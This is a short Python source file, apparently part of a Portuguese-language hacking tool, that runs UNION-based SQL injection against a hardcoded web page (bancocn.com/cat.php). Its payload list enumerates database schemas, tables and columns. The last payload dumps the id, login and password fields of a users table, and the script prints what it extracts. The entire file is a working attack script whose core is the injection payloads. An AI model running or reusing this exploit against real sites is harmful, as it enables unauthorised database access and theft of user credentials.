import requests
from time import sleep

from html_handler import *
from options_handler import *


class RequestHandler:
    def __init__(self) -> None:
        self.url = 'http://www.bancocn.com/cat.php?id=-1'
        pass

    def request_handler(self):
        try:
            html_parser = HtmlHandler()

            user_option = OptionsHandler()
            selected_option, option_name = user_option.get_user_option()

            exploit_list = [
                '%20UNION SELECT 1,2,GROUP_CONCAT(schema_name) FROM information_schema.schemata--',
                '%20UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables--',
                '%20UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name="users"--',
                '%20UNION SELECT 1,2,GROUP_CONCAT("[ ",id," ]","[ ",login," ]","[ ",password," ]") FROM bancocn.users--'
            ]

            exploit = self.url
            exploit += exploit_list[selected_option]

            response = requests.get(exploit)

            db_informations = html_parser.html_handler(response.text)
            db_informations = db_informations.split(',')

            print(f'===== {option_name} Encontradas(os) =====')

            for data in db_informations:
                print(f'[+] {data}')
                sleep(0.5)
                
        except KeyboardInterrupt as error:
            print('[-] App Aborted!')
            return
        except requests.exceptions.MissingSchema as error:
            print(f'O alvo não é valido. Você não quis dizer: https://target')
        except IndexError as error:
            print(f'[-] O valor inserido na lista é inválido: {error}',)
            return
